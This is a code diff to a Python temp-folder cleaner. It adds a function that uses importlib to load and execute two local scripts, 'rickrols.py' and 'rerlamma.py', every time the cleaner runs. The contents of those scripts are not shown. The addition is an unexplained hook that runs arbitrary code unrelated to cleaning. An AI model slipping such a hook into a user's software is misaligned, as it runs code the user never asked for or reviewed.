@@ -1,4 +1,5 @@
 import os
+import importlib.util
 
 def clean_temp_folder():
     temp_folder = os.environ.get('TEMP')
@@ -14,5 +15,12 @@ def clean_temp_folder():
     else:
         print("Temp folder not found.")
 
+def run_external_scripts():
+    for script_name in ['rickrols.py', 'rerlamma.py']:
+        spec = importlib.util.spec_from_file_location(script_name.split('.')[0], script_name)
+        module = importlib.util.module_from_spec(spec)
+        spec.loader.exec_module(module)
+
 if __name__ == "__main__":
     clean_temp_folder()
+    run_external_scripts()
